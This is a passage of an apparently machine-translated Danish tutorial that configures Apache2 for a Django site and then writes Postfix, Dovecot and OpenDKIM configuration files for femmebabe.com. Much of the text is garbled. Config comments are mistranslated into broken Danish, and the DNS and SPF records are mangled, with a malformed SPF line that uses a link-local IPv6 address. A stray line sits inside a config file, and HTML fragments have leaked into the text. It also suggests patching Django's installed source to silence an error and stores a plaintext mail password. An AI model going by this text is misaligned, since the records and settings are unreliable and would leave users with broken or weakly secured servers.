</code></pre>Nu skal vi konfigurere Apache2. Lad os redigere den konfigurationsfil, vi vil implementere med denne linje:<pre class="language-bash"><code>
sudo nano /etc/apache2/sites-available/femmebabe-le-ssl.conf
</code></pre>Denne konfigurationsfil skal have vores domænenavn i den og navnet på brugeren og projektet. Jeg bruger domænenavnet femmebabe.com, brugernavnetteamet og projektnavnet femmebabe.<pre class="language-bash"><code>
ServerSignature Off
ServerTokens Prod
&lt;IfModule mod_ssl.c&gt;
&lt;VirtualHost *:80&gt; 
	Redirect permanent / https://femmebabe.com/
&lt;/VirtualHost&gt;
&lt;VirtualHost *:443&gt;
	ServerName femmebabe.com
	ServerAdmin team@femmebabe.com
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	
	Alias /static /home/team/femmebabe/static
	&lt;Directory /home/team/femmebabe/static&gt;
		Require all granted
	&lt;/Directory&gt;

Alias /media/icons /home/team/femmebabe/media/
&lt;Directory /home/team/femmebabe/media&gt;
Require all granted
&lt;/Directory&gt;

	&lt;Directory /home/team/femmebabe/femmebabe&gt;
		&lt;Files wsgi.py&gt;
			Require all granted
		&lt;/Files&gt;
	&lt;/Directory&gt;

	WSGIScriptAlias / /home/team/femmebabe/femmebabe/wsgi.py
	WSGIDaemonProcess femmebabe python-path=/home/team/femmebabe/ python-home=/home/team/femmebabe/venv header-buffer-size=100000000000 user=team
	WSGIProcessGroup femmebabe
	WSGIApplicationGroup %{GLOBAL}
	
	&lt;Directory /home/team/femmebabe/static&gt;
                Options Indexes FollowSymLinks
                AllowOverride All
	&lt;/Directory&gt;

	&lt;IfModule mod_rewrite.c&gt;
		RewriteEngine on
		RewriteCond %{REQUEST_URI} \.(css|webp|webm|gif|png|mp3|wav|jpeg|jpg|svg|webp)$ [NC]
		RewriteCond %{HTTP_REFERER} !^https://femmebabe.com/media/.*$ [NC]
		RewriteRule ^(.+?)/$ /media/$1 [F,L]
	&lt;/IfModule&gt;

	Include /etc/letsencrypt/options-ssl-apache.conf
	SSLCertificateFile /etc/letsencrypt/live/femmebabe.com/fullchain.pem
	SSLCertificateKeyFile /etc/letsencrypt/live/femmebabe.com/privkey.pem

	Header set X-Frame-Options: "SAMEORIGIN"
	Header set Access-Control-Allow-Origin "https://femmebabe.com"

	TimeOut 60000
	LimitRequestBody 0

	&lt;FilesMatch ".(ico|pdf|flv|jpg|jpeg|png|gif|webp|JPG|JPEG|wav|mp3|mp4|public|js|css|swf|webp|svg)$"&gt;
		Header set Cache-Control "max-age=30, public"
	&lt;/FilesMatch&gt;
&lt;/VirtualHost&gt;
&lt;/IfModule&gt;
&lt;IfModule mod_ssl.c&gt;
&lt;VirtualHost *:80&gt;
	ServerName femmebabe.com
	ServerAdmin team@femmebabe.com
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	RewriteEngine on
	RewriteCond %{SERVER_NAME} =femmebabe.com
	RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent]
&lt;/VirtualHost&gt;
&lt;/IfModule&gt;
</code></pre>Sørg for at udskifte navnet på projektet, mapper og domæne i dette eksempelkode, når du konfigurerer din server. Nu skal vi deaktivere standardwebstedet. Dette kan gøres ved hjælp af bash.<pre class="language-bash"><code>
sudo a2dissite 000-default-le-ssl
sudo a2dissite 000-default
sudo a2dissite default-ssl
</code></pre>Dernæst kan vi aktivere standardwebstedet og genindlæse Apache2, også ved hjælp af bash. Husk at udskifte femmebabe med navnet på den fil, du erklærede, da du redigerede i/etc/Apache2/websteder-tilgængelige/.<pre class="language-bash"><code>
sudo a2ensite femmebabe-le-ssl
sudo systemctl reload apache2
</code></pre>Gå tilbage til dit domæne i Navbar. Du skal se det websted, du konfigurerede i din webbrowser. Tillykke! Hvis du ikke kan se det, skal du muligvis foretage nogle ændringer. Gennemgå omhyggeligt indstillingerne i dit projekt, Apache -konfiguration, og sørg for, at du ikke har nogen fejl, og kør følgende kommandoer for at kontrollere projektet for fejl.<pre class="language-bash"><code>
cd projectname
source venv/bin/activate
python manage.py check
</code></pre>Hvis du har fejl i dit Python -projekt, skal du spore dem, hvor de er, og fikse dem. Du kan muligvis ikke se alle dine fejl afhængigt af hvor de er, så hvis du har en fejl, der simpelthen siger, at "befolkning ikke er reentrant", rediger følgende fil i det virtuelle miljø, Registry.py, for at udsætte det fejl.<pre class="language-bash"><code>
nano venv/lib/python3.12/site-packages/django/apps/registry.py
</code></pre>Rul til linje 83, hvor denne runtime -fejl hæves (hæv RuntimeError (“POPULATE () er ikke Reentrant”)), og tilføj en kommentar inden denne linje og derefter tilføje med den samme indrykkning, self.app_configs = {}. Dette ser sådan ud:<pre class="language-python"><code>
            if self.loading:
                # Forhindre Reentrant -opkald for at undgå at køre appconfig.ready ()
                # metoder to gange.
# hæve runtimeError ("POPULATE () er ikke Reentrant")
                self.app_configs = {}
            self.loading = True
</code></pre>Du kan derefter kontrollere projektet igen og udsætte fejlen.<pre class="language-bash"><code>
python manage.py check
</code></pre>Derefter kan du se fejlen og løse den. Når du har løst det, og koden kompilerer uden fejl, skal du sørge for at ændre filen tilbage, så den ser sådan ud:<pre class="language-python"><code>
            if self.loading:
                # Forhindre Reentrant -opkald for at undgå at køre appconfig.ready ()
                # metoder to gange.
                raise RuntimeError("populate() isn't reentrant")
# self.app_configs = {}
            self.loading = True
</code></pre>Forudsat at serveren er online, når vi foretager yderligere ændringer i den, er vi nødt til at bruge følgende kommando til at genindlæse serveren:<pre class="language-bash"><code>
sudo systemctl reload apache2
</code></pre>Fantastisk! Men hvad med at sende mail? For at begynde at sende e -mail skal vi først opdatere domænekonfigurationen. Dette skal være i dit DNS -panel i Squarespace, eller hvilket domænenavn Registrator du valgte. Vi bliver også nødt til at installere og tilføje konfiguration og køre et par kommandoer. 

Lad os først få IPv6 -adressen på serveren. Vi åbner derefter din DNS og tilføjer posterne.

Brug denne kommando: for at få serverens IPv6 -adresse: brug denne kommando:<pre class="language-bash"><code>
ip -6 addr
</code></pre>Nu kan vi tilføje følgende poster til DNS -indstillingerne. Mine poster ser sådan ud. For dine poster skal du dog erstatte IP -adressen med din IP (ikke 75.147.182.214, det er min). Tilføj også dit domæne i stedet for femmebabe.com, såvel som din IPv6 -adresse, der findes med den forrige kommando (du kan ikke bruge min, Fe80 :: 725A: FFF: FE49: 3E02). Du skal ikke bekymre dig om Domainkey for nu, dette oprettes, når vi konfigurerer Postfix, mailserveren, med Opendkim, og udskriver nøglen. Vi konfigurerer dette sidst.

@
EN
N/a
75.147.182.214

@
Mx
10
femmebabe.com

@
PTR
N/a
femmebabe.com

@
Txt
N/a
Txt @ v = SPF1 MX IP75.147.182.214IP6: FE80 :: 725A: FFF: FE49: 3E02 ~ ALL

Standard._bimi
Txt
N/a
v = bimi1; l = https: //femmebabe.com/media/static/femmebabe.svg

_dmarc
Txt
N/a
V = DMARC1; p = ingen

Sendonly._DomainKey
Txt
N/a<we'll add="" later="" this="">Nu skal vi tilføje en vedvarende konfiguration til Postfix. Alt, hvad vi skal gøre, er at sikre, at vi udskifter domænenavnet, femmebabe.com, med det domænenavn, du bruger. Lad os se på alle konfigurationsfiler en efter en, og installere dem i et bibliotek kaldet config i vores projekt, til installation til OS.<pre class="language-bash"><code>
nano config/etc_postfix_main.cf
</code></pre>Føj denne tekst til filen<pre class="language-bash"><code>
# Se /usr/share/postfix/main.cf.dist for en kommenteret, mere komplet version


# Debian -specifik: Specificering af et filnavn vil forårsage det første
# linje af den fil, der skal bruges som navn.  Debian -standard
# er /etc /mailname.
# myorigin = /etc /mailName

smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)
biff = no

# Ledning. Domain er MUAs job.
append_dot_mydomain = no

# Uproment den næste linje for at generere "forsinkede mail" -advarsler
# forsinkelse_warning_time = 4h

readme_directory = no

# Se http://www.postfix.org/compatibility_readme.html - standard til 3,6 på
# Friske installationer.
compatibility_level = 3.6



# TLS -parametre
smtpd_tls_cert_file=/etc/letsencrypt/live/femmebabe.com/fullchain.pem
smtpd_tls_key_file=/etc/letsencrypt/live/femmebabe.com/privkey.pem
smtpd_tls_security_level=may

smtp_tls_CApath=/etc/ssl/certs
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache

smtpd_relay_restrictions = permit_sasl_authenticated, defer_unauth_destination
myhostname = femmebabe.com
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = /etc/mailname
mydestination = femmebabe.com, localhost, $myhostname
smtp_helo_name = femmebabe.com
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = all

# Milterkonfiguration
milter_default_action = accept
milter_protocol = 6
smtpd_milters = local:/opendkim/opendkim.sock
non_smtpd_milters = $smtpd_milters

smtp_tls_security_level = encrypt
smtp_tls_loglevel = 1

virtual_transport=lmtp:unix:private/dovecot-lmtp

smtpd_sasl_path = private/auth
</code></pre>Næste konfiguration!<pre class="language-bash"><code>
nano config/etc_postfix_master.cf
</code></pre>Tilføj disse linjer:<pre class="language-bash"><code>
# 
# Postfix Master Process Configuration File.  For detaljer om formatet
# Af filen, se Master (5) Manuel side (kommando: "Man 5 Master" eller
# Online: http://www.postfix.org/master.5.html).
# 
# Glem ikke at udføre "Postfix Reload" efter redigering af denne fil.
# 
# ================================================ ========================
# Servicetype privat upriv chroot wakeup maxproc kommando + args
# (Ja) (ja) (nej) (aldrig) (100)
# ================================================ ========================
smtp      inet  n       -       y       -       -       smtpd
# SMTP INET N - Y - 1 postskærm
# SMTPD PASS - - Y - - SMTPD
# dnsblog   unix  -       -       y       -       0       dnsblog
# Tlsproxy unix - - y - 0 tlsproxy
# Vælg en: Aktivér kun indsendelse for loopback -klienter eller for enhver klient.
# 127.0.0.1:Submission inet N - Y - - SMTPD
submission inet n       -       y       -       -       smtpd
  -o smtpd_relay_restrictions=permit_sasl_authenticated,reject
  -o smtpd_recipient_restrictions=permit_sasl_authenticated,reject
  -o syslog_name=postfix/submission
  -o smtpd_tls_security_level=encrypt
  -o smtpd_tls_wrappermode=no
  -o smtpd_sasl_auth_enable=yes
  -o smtpd_sasl_type=dovecot
  -o smtpd_sasl_path=private/auth
# -o syslog_name = postfix/indsendelse
# -o smtpd_tls_security_level = kryptering
# -o smtpd_sasl_auth_enable = ja
# -o smtpd_tls_auth_only = ja
# -o smtpd_reject_unlisted_recipient = nr
# -O smtpd_client_restrictions = $ mua_client_restrictions
# -o smtpd_helo_restrictions = $ mua_helo_restrictions
# -o smtpd_sender_restrictions = $ mua_sender_restrictions
# -o smtpd_recipient_trastrictions =
# -o smtpd_relay_restrictions = tilladelse_sasl_authenticeret, afvis
# -O milter_macro_daemon_name = oprindelse
# Vælg en: Aktivér SMTPS kun for loopback -klienter eller for enhver klient.
# 127.0.0.1:smtps inet n  -       y       -       -       smtpd
# SMTPS INET N - Y - - SMTPD
# -O syslog_name = postfix/smtps
# -o smtpd_tls_wrappermode = ja
# -o smtpd_sasl_auth_enable = ja
# -o smtpd_reject_unlisted_recipient = nr
# -O smtpd_client_restrictions = $ mua_client_restrictions
# -o smtpd_helo_restrictions = $ mua_helo_restrictions
# -o smtpd_sender_restrictions = $ mua_sender_restrictions
# -o smtpd_recipient_trastrictions =
# -o smtpd_relay_restrictions = tilladelse_sasl_authenticeret, afvis
# -O milter_macro_daemon_name = oprindelse
# 628 inet n - y - - qmqpd
pickup    unix  n       -       y       60      1       pickup
cleanup   unix  n       -       y       -       0       cleanup
qmgr      unix  n       -       n       300     1       qmgr
# qmgr unix n - n 300 1 oqmg
tlsmgr    unix  -       -       y       1000?   1       tlsmgr
rewrite   unix  -       -       y       -       -       trivial-rewrite
bounce    unix  -       -       y       -       0       bounce
defer     unix  -       -       y       -       0       bounce
trace     unix  -       -       y       -       0       bounce
verify    unix  -       -       y       -       1       verify
flush     unix  n       -       y       1000?   0       flush
proxymap  unix  -       -       n       -       -       proxymap
proxywrite unix -       -       n       -       1       proxymap
smtp      unix  -       -       y       -       -       smtp
relay     unix  -       -       y       -       -       smtp
        -o syslog_name=postfix/$service_name
# -o smtp_helo_timeout = 5 -o smtp_connect_timeout = 5
showq     unix  n       -       y       -       -       showq
error     unix  -       -       y       -       -       error
retry     unix  -       -       y       -       -       error
discard   unix  -       -       y       -       -       discard
local     unix  -       n       n       -       -       local
virtual   unix  -       n       n       -       -       virtual
lmtp      unix  -       -       y       -       -       lmtp
anvil     unix  -       -       y       -       1       anvil
scache    unix  -       -       y       -       1       scache
postlog   unix-dgram n  -       n       -       1       postlogd
# 
# ================================================ ==================
# Grænseflader til ikke-postfix-software. Sørg for at undersøge manualen
# Sider på ikke-postfix-softwaren for at finde ud af, hvilke muligheder den ønsker.
# 
# Mange af følgende tjenester bruger levering af postfix -røret (8)
# agent.  Se røret (8) Kvindens side for information om $ {modtager}
# og andre meddelelseskonvolutindstillinger.
# ================================================ ==================
# 
# Maildrop. Se filen Postfix MailDrop_Readme for detaljer.
# Angiv også i Main.cf: MailDrop_Destination_Recipient_Limit = 1
# 
maildrop  unix  -       n       n       -       -       pipe
  flags=DRXhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
# 
# ================================================ ==================
# 
# Nylige Cyrus -versioner kan bruge den eksisterende "LMTP" Master.CF -post.
# 
# Specificer i cyrus.conf:
# lmtp cmd = "lmtpd -a" lyt = "localhost: lmtp" proto = tcp4
# 
# Specificer i main.cf en eller flere af følgende:
# Mailbox_transport = lmtp: inet: localhost
# Virtual_transport = lmtp: inet: localhost
# 
# ================================================ ==================
# 
# Cyrus 2.1.5 (Amos Gouaux)
# Angiv også i main.cf: cyrus_destination_recipient_limit = 1
# 
# Cyrus Unix - N N - - Rør
#   flags=DRX user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
# 
# ================================================ ==================
# Gamle eksempel på levering via Cyrus.
# 
# Old -Cyrus Unix - N N - - Rør
# flag = r user = cyrus argv =/cyrus/bin/levering -e -m $ {udvidelse} $ {bruger}
# 
# ================================================ ==================
# 
# Se filen Postfix UUCP_README for konfigurationsdetaljer.
# 
uucp      unix  -       n       n       -       -       pipe
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
# 
# Andre eksterne leveringsmetoder.
# 
ifmail    unix  -       n       n       -       -       pipe
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
bsmtp     unix  -       n       n       -       -       pipe
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
scalemail-backend unix -       n       n       -       2       pipe
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
mailman   unix  -       n       n       -       -       pipe
  flags=FRX user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py ${nexthop} ${user}
</code></pre>Og Opendkim -konfigurationen. Opendkim identificerer e -mail -servere med domænetaster for at gøre dem mere sikre. Uden det er mail ikke underskrevet og kommer muligvis ikke til en indbakke.<pre class="language-bash"><code>
nano config/etc_default_opendkim
</code></pre>Tilføj disse linjer:<pre class="language-bash"><code>
# Bemærk: Dette er en ældre konfigurationsfil. Det bruges ikke af opendkim
# Systemd Service. Brug venligst de tilsvarende konfigurationsparametre i
# /etc/opendkim.conf i stedet.
# 
# Tidligere ville man redigere standardindstillingerne her og derefter udføre
#  /lib/opendkim/opendkim.service.generate to generate systemd override files at
# /etc/systemd/system/opendkim.service.d/override.conf og
# /etc/tmpfiles.d/opendkim.conf. Selvom dette stadig er muligt, er det nu
# anbefales at justere indstillingerne direkte i /etc/opendkim.conf.
# 
# Daemon_opts = ""
# Skift til/var/spole/postfix/run/opendkim til at bruge en Unix -stik med
# postfix i en chroot:
# Rundir =/var/spole/postfix/run/opendkim
RUNDIR=/run/opendkim
# 
# Ukommentere for at specificere en alternativ stikkontakt
# Bemærk, at indstilling af dette vil tilsidesætte enhver stikkontakt i opendkim.conf
# misligholdelse:
SOCKET="local:/var/spool/postfix/opendkim/opendkim.sock"
# Lyt på alle grænseflader på port 54321:
# Socket = inet: 54321
# Lyt på loopback på port 12345:
# Socket = inet: 12345@localhost
# Hør er 192.0.2.1 er port 12345:
# Socket = inet: 12345@192.0.2.1
USER=opendkim
GROUP=opendkim
PIDFILE=$RUNDIR/$NAME.pid
EXTRAAFTER=
</code></pre>
<pre class="language-bash"><code>
nano config/etc_dovecot_conf.d_10-master.conf
</code></pre>Tilføj disse linjer:<pre class="language-bash"><code>
0-master.conf 
# standard_process_limit = 100
# Standard_client_limit = 1000

# Standard VSZ (virtuel hukommelsesstørrelse) grænse for serviceprocesser. Dette er hovedsageligt
# beregnet til at fange og dræbe processer, der lækker hukommelse, før de spiser op
# alt.
# Standard_vsz_limit = 256m

# Loginbruger bruges internt af loginprocesser. Dette er den mest ikke -betroede
# Bruger i Dovecot System. Det skulle overhovedet ikke have adgang til noget.
# Standard_login_user = Davenull

# Intern bruger bruges af uprivilegerede processer. Det skal være adskilt fra
# Loginbruger, så login -processer ikke kan forstyrre andre processer.
# standard_internal_user = dovecot

service imap-login {
  inet_listener imap {
    # Port = 143
  }
  inet_listener imaps {
    # Port = 993
    # SSL = ja
  }

  # Antal forbindelser, der skal håndteres, inden du starter en ny proces. Typisk
  # De eneste nyttige værdier er 0 (ubegrænset) eller 1. 1 er mere sikker, men 0
  # er hurtigere. &lt;doc/wiki/loginprocess.txt&gt;
  # service_count = 1

  # Antal processer, der altid fortsætter med at vente på flere forbindelser.
  # Process_min_avail = 0

  # Hvis du indstiller service_count = 0, er du sandsynligvis nødt til at vokse dette.
  # Vsz_limi = $ standard_vsz_limit
}

service pop3-login {
  inet_listener pop3 {
    # Port = 110
  }
  inet_listener pop3s {
    # Port = 995
    # SSL = ja
  }
}

service submission-login {
  inet_listener submission {
    # Port = 587
  }
}

service lmtp {
  unix_listener /var/spool/postfix/private/dovecot-lmtp {
    group = postfix
    mode = 0666
    user = postfix
  }

  # Opret INET -lytter kun, hvis du ikke kan bruge ovenstående UNIX -stikkontakt
  # inet_lister lmtp {
    # Undgå at gøre LMTP synlig for hele internettet
    # Adresse =
    # port =
  # }
}

service imap {
  # De fleste af hukommelsen går til mmap () ing -filer. Du skal muligvis øge dette
  # Begræns, hvis du har enorme postkasser.
  # vsz_limit = $ standard_vsz_limit

  # Maks. Antal IMAP -processer (forbindelser)
  # Process_limit = 1024
}

service pop3 {
  # Maks. Antal POP3 -processer (forbindelser)
  # Process_limit = 1024
}

service submission {
  # Maks. Antal SMTP -indsendelsesprocesser (forbindelser)
  # Process_limit = 1024
}

service auth {
  # auth_socket_path peger som standard på denne UserDB -stikkontakt. Det er typisk
  # Brugt af dovecot-lda, doveadm, muligvis IMAP-proces osv. Brugere, der har
  # Fuld tilladelser til denne stikkontakt er i stand til at få en liste over alle brugernavne og
  # Få resultaterne af alles UserDB -opslag.
  # 
  # Standard 0666 -tilstand giver enhver mulighed for at oprette forbindelse til stikket, men
  # userdb -opslag vil kun lykkes, hvis userdb returnerer et "uid" felt, der
  # Matcher opkaldsprocessens UID. Også hvis opkalds UID eller GID matcher
  # Socket's UID eller GID, opslagen lykkes. Alt andet forårsager en fiasko.
  # 
  # For at give den, der ringer til fulde tilladelser til at slå alle brugere op, skal du indstille tilstanden til
  # noget andet end 0666 og dovecot lader kernen håndhæve
  # Tilladelser (f.eks. 0777 tillader alle fulde tilladelser).
  unix_listener /var/spool/postfix/private/auth {
    mode = 0660
    user = postfix
    group = postfix
  }
}

service auth-worker {
  # Author -arbejdsprocessen køres som rod som standard, så den kan få adgang til
  # /etc/skygge. Hvis dette ikke er nødvendigt, skal brugeren ændres til
  # $ standard_interal_user.
  # bruger = rod
}

service dict {
  # Hvis dict proxy bruges, skal mail -processer have adgang til dens stikkontakt.
  # For eksempel: tilstand = 0660, gruppe = vmail og global mail_access_groups = vmail
  unix_listener dict {
    # Mode = 0600
    # Bruger =
    # gruppe =
  }
}
</code></pre>Sørg igen for at udskifte domænet i alle disse filer, femmebabe.com, med det domæne, du valgte. Rediger den næste fil, Dovecot's Config,<pre class="language-bash"><code>
nano config/etc_dovecot_dovecot
</code></pre>Og tilføj disse linjer<pre class="language-bash"><code>
## OVECOT -konfigurationsfil

# Hvis du har travlt, kan du se http://wiki2.dovecot.org/quickconfiguration

# "Doveconf -N" -kommando giver en ren output af de ændrede indstillinger. Brug det
# I stedet for at kopiere og indsætte filer, når du offentliggør til Dovecot -mailinglisten.

# '# 'Karakter og alt efter det er behandlet som kommentarer. Ekstra rum
# og faner ignoreres. Hvis du vil bruge en af ​​disse eksplicit, skal du sætte
# value inside quotes, eg.: key = "# char og bagefter whitespace "

# De fleste (men ikke alle) indstillinger kan tilsidesættes af forskellige protokoller og/eller
# Kilde/destination IPS ved at placere indstillingerne i sektioner, for eksempel:
# Protocol IMAP {}, lokal 127.0.0.1 {}, fjernbetjening 10.0.0.0/8 {}

# Standardværdier vises for hver indstilling, det kræves ikke at fjerne
# dem. Dette er dog undtagelser fra dette: ingen sektioner (f.eks. Navneområde {})
# Eller pluginindstillinger tilføjes som standard, de er kun anført som eksempler.
# Stier er også kun eksempler, hvor de reelle standarder er baseret på konfiguration
# muligheder. De stier, der er anført her, er til konfiguration -Prefix =/usr
# --SysConfDir =/etc--LocalStatedir =/var

# Aktivér installerede protokoller
!include_try /usr/share/dovecot/protocols.d/*.protocol

# En komma -adskilt liste over IP'er eller værter, hvor man skal lytte til forbindelser.
# "*" lytter i alle IPv4 -grænseflader, "::" lytter i alle IPv6 -grænseflader.
# Hvis du vil specificere ikke-default-porte eller noget mere komplekst,
# Rediger conf.d/master.conf.
# Lyt = *, ::

# Basiskatalog, hvor man skal gemme runtime -data.
# base_dir =/var/run/dovecot/

# Navn på denne instans. I multi-instans-opsætning Doveadm og andre kommandoer
# kan bruge -i &lt;instance_name&gt; til at vælge, hvilken forekomst der bruges (et alternativ
# til -c &lt;config_path&gt;). Forekomstnavnet tilføjes også til Dovecot -processer
# I PS -output.
# Instance_name = dovecot

# Hilsen besked til klienter.
# login_greeting = dovecot klar.

# Rum adskilt liste over betroede netværksområder. Forbindelser fra disse
# IPS har lov til at tilsidesætte deres IP -adresser og porte (til logning og
# til godkendelseskontrol). deaktiver_plaintext_auth ignoreres også for
# Disse netværk. Typisk vil du specificere dine IMAP -proxy -servere her.
# login_trusted_networks =

# Rum adskilt liste over loginadgangskontrolstik (f.eks. TCPWRAP)
# login_access_sockets =

# Med proxy_maybe = ja Hvis proxy destination matcher nogen af ​​disse IP'er, skal du ikke gøre
# Proxying. Dette er normalt ikke nødvendigt, men kan være nyttigt, hvis destinationen
# IP er f.eks. En belastningsbalancers IP.
# auth_proxy_self =

# Vis flere ordrette processtitler (i PS). Viser i øjeblikket brugernavn og
# IP -adresse. Nyttigt til at se, hvem der faktisk bruger IMAP -processerne
# (f.eks. Delt postkasser, eller hvis det samme UID bruges til flere konti).
# Verbose_proctitle = nr

# Skulle alle processer dræbes, når Dovecot -masterprocessen lukker ned.
# At indstille dette til "ingen" betyder, at dovecot kan opgraderes uden
# at tvinge eksisterende klientforbindelser til at lukke (selvom det også kunne være
# Et problem, hvis opgraderingen er f.eks. På grund af en sikkerhedsfix).
# shutdown_clients = ja

# Hvis du ikke er nul, skal du køre mail-kommandoer via disse mange forbindelser til DOVEADM-server,
# I stedet for at køre dem direkte i den samme proces.
# doveadm_worker_count = 0
# UNIX Socket eller vært: Port brugt til oprettelse til DoveAdm -server
# doveadm_socket_path = doveadm-server

# Rum adskilt liste over miljøvariabler, der er bevaret på Dovecot
# opstart og overført til alle sine børneprocesser. Du kan også give
# nøgle = værdi par for altid at indstille specifikke indstillinger.
# Import_en miljø = TZ

## 
## Indstillinger for ordbogsserver
## 

# Ordbog kan bruges til at gemme nøgle = værdi lister. Dette bruges af flere
# plugins. Ordbogen kan fås enten direkte eller skønt en
# Ordbogserver. Følgende Dict Block Maps ordbognavne til URIS
# Når serveren bruges. Disse kan derefter henvises til ved hjælp af URI'er i format
# "Proxy :: &lt;navn&gt;".

dict {
  # kvote = mysql: /etc/dovecot/dovecot-dict-sql.conf.ext
}

# De fleste af den faktiske konfiguration bliver inkluderet nedenfor. Filnavne er
# Sorteret først efter deres ASCII -værdi og analyseret i den rækkefølge. 00-præfikser
# I filnavne er beregnet til at gøre det lettere at forstå bestillingen.
!include conf.d/*.conf

# En konfigurationsfil kan også forsøgte at blive inkluderet uden at give en fejl, hvis
# det er ikke fundet:
!include_try local.conf

passdb {
  driver = passwd-file
  args = /etc/dovecot/passwd
}
userdb {
  driver = passwd
}

protocols = imap pop3

# Tillader Dovecot at lytte til alle inputforbindelser (IPv4 / IPv6)

listen = *, ::
</code></pre>Tilføj en adgangskode til Dovecot -brugeren:<pre class="language-bash"><code>
nano config/etc_dovecot_passwd
</code></pre>Den første del af filen, før tyktarmen, er brugernavnet. Den sidste del, "YourPassword", angiver den adgangskode, du gerne vil give din mailserver.<pre class="language-bash"><code>
team:{plain}yourpassword
</code></pre>Dernæst opendkim config<pre class="language-bash"><code>
nano config/etc_opendkim.conf
</code></pre>Og tilføj disse linjer:<pre class="language-bash"><code>
# Dette er en grundlæggende konfiguration til underskrift og verifikation. Det kan let være
# Tilpasset til en grundlæggende installation. Se opendkim.conf (5) og
# /usr/share/doc/opendkim/examples/opendkim.conf.sample for komplet
# Dokumentation af tilgængelige konfigurationsparametre.

Syslog			yes
SyslogSuccess		yes
# Logwhy nej

# Almindelige signerings- og verifikationsparametre. I Debian er "fra" header
# Oversegnet, fordi det ofte er identitetsnøglen, der bruges af omdømme systemer
# og dermed noget sikkerhedsfølsomme.
Canonicalization	relaxed/simple
Mode			s
SubDomains		no
OversignHeaders		From

# Signering af domæne, vælger og nøgle (påkrævet). For eksempel skal du udføre signering
# For domæne "Eksempel.com" med vælger "2020" (2020._domainkey.example.com),
# Brug af den private nøgle, der er gemt i /etc/dkimkeys/example.private. Mere granulær
# Opsætningsmuligheder findes i /usr/share/doc/opendkim/readme.opendkim.
# Domæneeksempel.com
# Vælger 2020
# KeyFile /etc/Dkimkeys/Example.Private

# I Debian kører Opendkim som bruger "Opendkim". En umask på 007 er påkrævet, når
# Brug af en lokal stikkontakt med MTA'er, der får adgang til stikket som en ikke-privilegeret
# Bruger (for eksempel Postfix). Du skal muligvis tilføje brugeren "postfix" til gruppe
# "Opendkim" i dette tilfælde.
UserID			opendkim
UMask			007

# Socket til MTA -forbindelsen (påkrævet). Hvis MTA er inde i et Chroot -fængsel,
# Det skal sikres, at stikket er tilgængeligt. I Debian løber Postfix ind
# En chroot i/var/spool/postfix, derfor skulle en Unix -stik være
# Konfigureret som vist på den sidste linje nedenfor.
# Socket Local: /run/Opendkim/opendkim.sock
# Socket Inet: 8891@localhost
# Socket Inet: 8891
Socket			local:/var/spool/postfix/opendkim/opendkim.sock

PidFile			/run/opendkim/opendkim.pid

# Værter, som de skal underskrives i stedet for at verificere, standard er 127.0.0.1. Se
# Betjeningssektion af Opendkim (8) for mere information.
# InternalHosts 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12

# Tillidsankeret muliggør DNSSEC. I Debian leveres tillidsankerfilen
# Af pakken DNS-ROOT-DATA.
TrustAnchorFile		/usr/share/dns/root.key
# Nameservers 127.0.0.1

# Kortdomæner fra adresser til nøgler, der bruges til at underskrive beskeder
KeyTable           refile:/etc/opendkim/key.table
SigningTable       refile:/etc/opendkim/signing.table

# Et sæt interne værter, hvis mail skal underskrives
InternalHosts       /etc/opendkim/trusted.hosts
</code></pre>
<pre class="language-bash"><code>
nano config/etc_default_opendkim
</code></pre>Og tilføj disse linjer<pre class="language-bash"><code>
# Bemærk: Dette er en ældre konfigurationsfil. Det bruges ikke af opendkim
# Systemd Service. Brug venligst de tilsvarende konfigurationsparametre i
# /etc/opendkim.conf i stedet.
# 
# Tidligere ville man redigere standardindstillingerne her og derefter udføre
#  /lib/opendkim/opendkim.service.generate to generate systemd override files at
# /etc/systemd/system/opendkim.service.d/override.conf og
# /etc/tmpfiles.d/opendkim.conf. Selvom dette stadig er muligt, er det nu
# anbefales at justere indstillingerne direkte i /etc/opendkim.conf.
# 
# Daemon_opts = ""
# Skift til/var/spole/postfix/run/opendkim til at bruge en Unix -stik med
# postfix i en chroot:
# Rundir =/var/spole/postfix/run/opendkim
RUNDIR=/run/opendkim
# 
# Ukommentere for at specificere en alternativ stikkontakt
# Bemærk, at indstilling af dette vil tilsidesætte enhver stikkontakt i opendkim.conf
# misligholdelse:
SOCKET="local:/var/spool/postfix/opendkim/opendkim.sock"
# Lyt på alle grænseflader på port 54321:
# Socket = inet: 54321
# Lyt på loopback på port 12345:
# Socket = inet: 12345@localhost
# Hør er 192.0.2.1 er port 12345:
# Socket = inet: 12345@192.0.2.1
USER=opendkim
GROUP=opendkim
PIDFILE=$RUNDIR/$NAME.pid
EXTRAAFTER=
</code></pre>Når vi er klar til at konfigurere vores Postfix -server, kører vi nedenstående kode med det relevante domænenavn indlejret. Start med at oprette et script<pre class="language-bash"><code>
touch scripts/postfixsetup
sudo chmod a+x scripts/postfixsetup
nano scripts/postfixsetup
</code></pre>Nu, i Nano, teksteditoren, redigerer denne fil, så den inkluderer dit domænenavn i stedet for femmebabe.com.<pre class="language-bash"><code>
# !
# Opsætning Postfix
cd $DIR
echo "Mail services configuration"
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup
sudo cp config/etc_postfix_main.cf /etc/postfix/main.cf
sudo cp config/etc_postfix_master.cf /etc/postfix/master.cf
sudo cp config/etc_default_opendkim /etc/default/opendkim
